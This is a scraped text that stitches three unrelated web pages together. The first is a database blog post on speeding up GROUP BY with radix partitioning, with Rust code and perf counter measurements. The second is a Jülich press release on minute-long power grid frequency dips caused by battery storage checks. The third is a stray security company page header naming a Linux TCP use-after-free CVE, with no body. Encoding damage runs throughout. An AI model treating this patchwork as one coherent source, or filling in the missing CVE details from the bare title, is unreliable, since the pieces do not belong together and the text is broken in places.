body_text: It's the memory latency, stupid Â· Pivot blog Docs Blog Slack GitHub Get started â All posts It's the memory latency, stupid Making GROUP BY faster by doing more (CPU!) work October 28, 2026 Â· Maor Kern Disclaimer no LLMs were harmed (or for that matter used) in the writing of this blog post When you see your databases CPU at 100%, what is it actually doing? We like to act as though CPUs run code linearly for simplicity's sake, but in truth CPUs are incredibly complex beasts; they can potentially do many instructions at once, or sometimes none at all (despite our console showing 100%). Because CPUs can do so many things, one CPU at 100% may be doing much less than another at 100%. A CPU is considered "idle" only if no task (Linux task) needs CPU time; this does not mean the CPU itself is being fully saturated. So why would a CPU not be fully utilized, even if it appears to be at 100%? The answer is usually memory . Memory accesses are orders of magnitude slower than internal CPU operations. To give a good picture of how much so, a modern CPU might be able to process somewhere in the realm of 4-8 instructions per nanosecond. A memory access to RAM can take somewhere in the realm of 50-100ns. To ease your mathing, that means a modern CPU can do around 400-800 instructions for every one memory access from RAM. CPU CPU core 4â8 instr / ns L1 cache ~1 ns ~64 KB Â· ~4â8 instructions per access L2 cache ~3â4 ns ~1 MB Â· ~15â30 instructions per access L3 cache ~10â15 ns up to a few hundred MB Â· ~50â100 instructions per access DRAM ~50â100 ns GBs Â· ~400â800 instructions per access Given this, CPUs are built from the ground up to work their way around this. The most obvious way this is dealt with is CPU caches. CPU caches keep memory closer to the CPU than RAM, literally baked into the CPU chip. The closest cache (the L1 cache) takes around 1ns per memory operation- that's 50-100x faster than RAM! The "problem" here of course is that the CPU caches are fairly small; the L1 cache for a modern CPU is probably around ~64KB, while the farther caches max out at a few hundred MB for top end processors. A good database tries manipulating data in small "chunks" to take full advantage of caches, and you'll often hear cache utilization as being one of the top concerns of performance engineering. Let's look at GROUP BY aggregations to get a better grip on cache utilization. In GROUP BY, we're looking to take a dataset, group it by a certain column (or more), and perform certain aggregations (for example, count, or sum on another column). The "naive" method might be to open a HashTable keyed by the group key that grows ever larger. For every new row, you would check if that key exists- if it does, go to it's corresponding aggregation and update the result. Simple, right? The problem is that if you have millions of unique groups, you're not utilizing your cache at all! Nearly every HashTable access will be a "cold" hit that goes to RAM. This means that although your CPU may /look/ like it's 100% utilized, in truth it'll constantly be waiting for cold memory accesses. To demonstrate this, we'll take our state-of-the-art Pivot engine and ravage it! We'll remove all our complex logic and replace it with simplicity: fn consume ( & mut self , batch: RecordBatch , _sender: & mut dyn Sender < RecordBatch >, ) -> unary:: Result <()> { let group_keys = batch. column ( self .key_column). as_primitive ::< Int64Type >(); for &key in group_keys. values () { // If the Group Key doesn't exist- set it to 0 // Afterwards, add 1 to the group- this will give us a count(*) GROUP BY key_column * self .counts. entry (key). or_insert ( 0 ) += 1 ; } } We'll then run a simple query SELECT count(*), UserID FROM hits GROUP BY UserID on the "hits" dataset ClickBench provides (99m rows). This query will give us a count per UserID , meaning we'll have an entry in our HashMap per UserID - I'll give a spoiler here that there are ~17m unique UserID . Our performance checks will be on a bare metal server from our good friends over at CherryServers (AMD EPYC 9124 Genoa, 16 cores, 128 GB DDR5). We unfortunately can't use a common AWS/GCP machine because we want access to counters that aren't exposed there for security reasons (for example, we want to see how much memory is passing from DRAM controller to us). We'll confine ourselves to a single core, since this naive group by can't run on many cores. To run it: cat > config.yaml << 'EOF' server : bind : 127.0.0.1:5440 workers : 1 datastores : default : kind : pivotlake location : ./data default : true users : pivot : auth : method : trust EOF taskset -c 3 pivot server --config config.yaml & taskset -c 7 psql -h 127.0.0.1 -p 5440 -U pivot -c '\timing on' -c "SELECT count(*) FROM (SELECT COUNT(*), UserID FROM hits GROUP BY UserID)" This takes... a whopping 3.9 seconds. Is that good? Is that bad? Everything in this world is relative, or so they say. If we run the query again (without restarting the server), it takes 3.6s. The second run is the one we're more interested in- there's no disk involved as everything is already sitting in our page-cache. You'll notice we did taskset -c . This pins the process to a given CPU; this will allow us to run perf stat on that CPU and see what's going on internally. We'll measure two metric groups- percentage of CPU slots stalling because of memory (and not doing anything in the meanwhile), and percentage of CPU slots actually retiring a micro-op: sudo perf stat -C 3 -M backend_bound_memory,retiring -- taskset -c 7 psql -h 127.0.0.1 -p 5440 -U pivot -c "SELECT count(*) FROM (SELECT COUNT(*), UserID FROM hits GROUP BY UserID)" and we get back this Performance counter stats for 'CPU(s) 3': 8364109137 ex_no_retire.load_not_complete # 50.1 % backend_bound_memory 38233214040 de_no_dispatch_per_slot.backend_stalls 8977647849 ex_no_retire.not_complete 11861387798 ls_not_halted_cyc 11431618219 ex_ret_ops # 16.1 % retiring 11858248045 ls_not_halted_cyc 4.030148989 seconds time elapsed This tells us that 50.1% of the time, the CPU couldn't do anything because it was stalling on memory! And only 16.1% of the time the CPU was actually retiring (aka doing) operations. Another interesting stat to get is how many of our CPU memory loads are coming from DRAM (and not from caches): sudo perf stat -C 3 -e ls_dmnd_fills_from_sys.dram_io_near -- taskset -c 7 psql -h 127.0.0.1 -p 5440 -U pivot -c "SELECT count(*) FROM (SELECT COUNT(*), UserID FROM hits GROUP BY UserID)" And the result: Performance counter stats for 'CPU(s) 3': 76190837 ls_dmnd_fills_from_sys.dram_io_near 3.996301634 seconds time elapsed Every load is 64 bytes (the minimum amount you can bring, a cache line), so we can multiply by 64 to see we pulled 4.5GB during this query from DRAM on CPU loads (this is without any prefetching). Let's now try to improve our algorithm to take advantage of the CPU caches. To do this, we'll use a method called radix partitioning. The idea is to split the merge into two distinct phases: Phase 1: In this phase, we're simply going to separate the keys into 4096 different partitions (simply a Vec of SlabVecs- a SlabVec is a data structure similar to a Vec that is above memory that is already paged in. We don't use Vecs for raw memory in Pivot because it creates a lot of variance; not something for this blog post!). The partition will be decided by hashing the key and taking it's top 12 bits (2**12=4096). fn consume ( & mut self , batch: RecordBatch , _sender: & mut dyn Sender < RecordBatch >, ) -> unary:: Result <()> { let keys = batch. column ( self .key_column). as_primitive ::< Int64Type >(); for &key in keys. values () { let hash = self .hasher. hash_one (key); // Since we want top 12 bits, we shift the hash (a u64) 52 bits to the right let partition = (hash >> 52 ) as usize; self .partitions[partition]. push (& mut self .allocator, (hash, key)); } Ok (()) } UserID hash(UserID) 7 0x 002 A91F3â¦ 42 0x 000 7C4E2â¦ 13 0x FFF 3B05Dâ¦ 7 0x 002 A91F3â¦ 5 0x 001 D6A88â¦ 42 0x 000 7C4E2â¦ 99 0x 002 E17B4â¦ 7 0x 002 A91F3â¦ â partition = hash >> 52 , the first 3 hex digits Partition 0 0x000000â¦ â 0x000FFFâ¦ 42 42 Partition 1 0x001000â¦ â 0x001FFFâ¦ 5 Partition 2 0x002000â¦ â 0x002FFFâ¦ 7 7 99 7   â¦ Partition 4095 0xFFF000â¦ â 0xFFFFFFâ¦ 13 Phase 2: When all data has come through, go partition by partition, each time creating a HashMap, aggregating the partition into it, and then outputting it. This phase is very similar to our original algorithm, but we're going to use the hash from phase 1. fn into_outputter ( self ) -> unary:: Result < Option < Self :: Outputter >> { let mut groups = Vec :: new (); for rows in & self .partitions { let mut table: HashTable <(u64, i64, u64)> = HashTable :: new (); // (hash, key, count) rows. for_each (|(hash, key)| { match table. entry (hash, |group| group. 1 == key, |group| group. 0 ) { Entry :: Occupied ( mut group) => group. get_mut (). 2 += 1 , Entry :: Vacant (slot) => { slot. insert ((hash, key, 1 )); } } }); groups. extend (table. into_iter (). map (|(_, key, count)| (key, count))); } Ok ( Some ( Outputter :: new (groups))) } Partitions, one at a time 0â1 done 2 in progress 3â4095 waiting Partition 2 HashTable Output 7 7 99 7 â UserID count 7 3 99 1 â (UserID, count) (7, 3) (99, 1) At first glance, this solution may seem rather odd. We're doing more operations here, not less! Every row, in both solutions, is hashed and sent into a HashMap. But in this solution, we're first pushing rows into seemingly meaningless vecs. The key here (no pun intended) is to understand why we've done this; it's to make the aggregating HashMaps smaller . By dividing our group by into 4096 pieces, we've made our working HashMaps much likelier to fit into our CPU caches. Every time we do a lookup on our HashMap, our CPU is more likely to find the relevant memory sitting in it's caches, which saves a big chunk of time. But why trust me? Let's run it! taskset -c 7 psql -h 127.0.0.1 -p 5440 -U pivot -c '\timing on' -c "SELECT count(*) FROM (SELECT COUNT(*), UserID FROM hits GROUP BY UserID)" And... Boom! 3.3 seconds, and then on second run 2.7 seconds! We've definitely made an improvement. But to really drive this point home, let's run perf again: sudo perf stat -C 3 -M backend_bound_memory,retiring -- taskset -c 7 psql -h 127.0.0.1 -p 5440 -U pivot -c "SELECT count(*) FROM (SELECT COUNT(*), UserID FROM hits GROUP BY UserID)" And our results: Performance counter stats for 'CPU(s) 3': 3790955223 ex_no_retire.load_not_complete # 23.5 % backend_bound_memory 20376118172 de_no_dispatch_per_slot.backend_stalls 5442424751 ex_no_retire.not_complete 10083617764 ls_not_halted_cyc 19350459182 ex_ret_ops # 32.2 % retiring 10023435553 ls_not_halted_cyc 3.575992317 seconds time elapsed Now we can see the picture has completely changed- 23.5% of the time is spent on waiting for memory (as opposed to 50% before), 32% for actually retiring operations. You may notice we're actually doing more work, not less- in this run, we did 19350459182 operations (the ex_ret_ops counter), whereas before the database did 11431618219 operations. This is worth it though, because as we said before- if we can translate cold DRAM accesses into CPU instructions, it's nearly always a good trade to make. In this case, we went down from 8364109137 CPU slots stalled because of memory to 3790955223. To complete the picture and really see we're pulling less memory from the DRAM, let's again check how many our memory loads come from DRAM: sudo perf stat -C 3 -e ls_dmnd_fills_from_sys.dram_io_near -- taskset -c 7 psql -h 127.0.0.1 -p 5440 -U pivot -c "SELECT count(*) FROM (SELECT COUNT(*), UserID FROM hits GROUP BY UserID)" Performance counter stats for 'CPU(s) 3': 25688280 ls_dmnd_fills_from_sys.dram_io_near 3.009547012 seconds time elapsed Whoo! That means that on demand we pulled 1.5GB from DRAM, instead of 4.5GB in the naive version. That, of course, isn't the limit of how much we can utilize our CPU cache for GROUP BYs. And utilizing our CPU cache isn't the only way we can "hide" DRAM latency; another trick is prefetching memory to our cache before we need it, and yet another trick is creating algorithms that allow maximization of memory throughput- but that's not for this blog! We'll go into that in our next blog where we look at our /seemingly very weird/ implementation of JOIN probing. For now, without explaining too much, I'll leave you with Pivot's speed for this query on a single core: Time: 1848.353 ms (00:01.848) and the amount of RAM we bring: Performance counter stats for 'CPU(s) 3': 14917958 ls_dmnd_fills_from_sys.dram_io_near 2.182674864 seconds time elapsed Which comes out to 954 MB. Of course, Pivot knows to run in parallel on our 16 cores (where there are many other interesting cases), in which case it comes out to: Time: 171.773 ms nice :) Try out Pivot if you want to have super speeds above parquets (OSS fun!), see you next time. â All posts Â© 2026 Epsio Labs

Fluctuations in Power Grids Solved Mystery of 60-Second Fluctuations in Power Grids Solved 30 October 2026 Why do our grids show a brief spike in electricity demand every minute? A team led by Dirk Witthaut from Forschungszentrum Jülich has now demonstrated that this is due to regular power checks carried out by large-scale battery storage systems. These findings could help to make our electricity supply more robust, as the team reports in an article published in Nature Energy . Copyright: Regine Panknin Tennet Germany, the largest transmission system operator in Germany, has observed over several years that the frequency in the European power grid dips briefly every 60 seconds. While these deviations were not critical to grid security, they were clearly measurable and unusually regular. The cause of this phenomenon was initially unclear. A team at Forschungszentrum Jülich led by Dirk Witthaut—who is also a professor at the Institute for Theoretical Physics at the University of Cologne—joined forces with other researchers from the University of Cologne and the Karlsruhe Institute of Technology to search for an answer—and they found it: the cause appears to be the many large-scale battery storage systems that check their state of charge every minute. This leads to measurable fluctuations in electricity consumption, which can contribute to turbine wear and tear, for example. The battery storage systems ensure an uninterrupted power supply, and their numbers have increased significantly worldwide in recent years. The researchers found that this was not a European phenomenon, but a global one. Many devices, a common rhythm “It really was years of detective work,” says Witthaut. The grid frequency pattern is shaped by many different factors. For example, it reveals the influence of electricity trading, with power stations being switched on and off abruptly, as well as the fluctuating feed-in from renewable energy sources, and various other disturbances. Uns war schnell klar, dass es sich bei der Ursache um etwas handeln muss, das von der Uhr gesteuert wird Prof. Dr. Dirk Witthaut, Leiter des Departments Netzwerke und komplexe Systeme, Institut für Energiesystemtechnik (ICE-1) “It quickly became clear to us that the cause must be something controlled by the clock,” says Witthaut. There was no other way to explain the precise 60-second cycle. It was also clear that: “The observed effect can only be produced if many devices are consuming electricity at the same time.” A single consumer or generator could therefore be ruled out. Measurements on campus provide the clue But how do all these devices synchronize their consumption? The researchers finally found the crucial clues with the help of the Living Lab Energy Campus. This research infrastructure on the Jülich campus is primarily used to develop and test highly integrated energy supply systems. The team installed measuring points on end devices at a total of 80 locations – and sure enough, the same periodic pattern in electricity consumption was observed precisely at the locations where large-scale battery storage systems are designed to ensure an uninterrupted power supply. “We took a closer look at one of them and found a spike in electricity consumption at the start of every minute due to the power check,” explains Witthaut. Detektive work from Carsten Hartmann and Dirk Witthaut of the Jülich Institute for Energy systems engineering Copyright: Forschungszentrum Jülich / Dirk Witthaut As there are no binding standards for such power checks, Witthaut suspects that most battery manufacturers assumed that a 60-second interval would be sensible. The start of every minute was simply chosen as the test time. “It is entirely possible, however, that battery storage systems are only part of the problem here,” says Witthaut. “It cannot be ruled out that other digitally controlled appliances – such as air-conditioning systems, heat pumps, washing machines, and dishwashers – may also exhibit similar patterns.” Less synchronization, less wear and tear The periodic fluctuations in electricity demand are already having an impact on hydroelectric power stations. The brief spikes in demand mean that the turbines slow down momentarily before accelerating back to their original rotational speed. This increases wear and tear. With the expansion of storage technologies, such problems could become even more prevalent. In Ireland, for example, where data centres with large-scale battery storage systems currently account for around a fifth of the country’s electricity demand, the amplitude of the 1-minute signal quadrupled between 2016 and 2021. The solution, however, would be simple: “You would simply have to distribute the checks randomly, rather than always starting them at the same time,” says Witthaut. Original publication: 'One-minute frequency disturbances from unintended synchronization in cyber–physical power systems', Nature Energy 2026, DOI: 10.1038/s41560-026-02144-0 Contact Prof. Dr. Dirk Witthaut Head of Department Institute of Climate and Energy Systems (ICE) Energy Systems Engineering (ICE-1) Building 10.21 / Room 4014 +49 2461/61-6178 E-Mail Prof. Andrea Benigni Director Institute of Climate and Energy Systems (ICE) Energy Systems Engineering (ICE-1) Building 10.21 / Room 4011 +49 2461/61-85523 E-Mail Media contact Dr. Regine Panknin Pressereferentin Building 15.3 / Room R 3028 +49 2461/61-9054 E-Mail More on the topic Energy transition Build Up More Energy Reserves With each percent more electricity generated from wind and solar power, it is becoming increasingly clear: more storage is required for the energy transition. In particular, different storage systems are needed – not just different types of batteries, but also hydrogen. This is the only way to offset fluctuations, cope with periods in which little to no energy is generated, and keep the network stable. Energy supply The blackout fairy tale Are nationwide power cuts in Germany due to supply shortages something we have to fear? No, says Jülich grid expert Prof. Dirk Witthaut. He also explains why, in some cases, legal regulations are a much bigger problem for the stability of electricity grids than renewable energies. Energy System Die Black-Box öffnen: Wie findet KI Schwachstellen im Stromnetz? In unserem Stromsystem verursachen alltägliche Schwankungen hohe Kosten für die Verbraucher und Risiken für die Betreiber. Doch was verursacht diese alltäglichen Schwankungen? Drei Jülicher, Kölner und Norweger Wissenschaftler sind dieser Frage auf den Grund gegangen – und fanden dabei große Unterschiede zwischen den Stromnetzen. Press Releases (in German) Stay up to date! body_text: Linux's October 2026 TCP Use-After-Free: CVE-2026-98432 — Atlas Services About Meridian Audit Contact Client Portal About Meridian Audit Contact Services Systems Architecting the future — Turning abstract visions into functional, scalable reality.
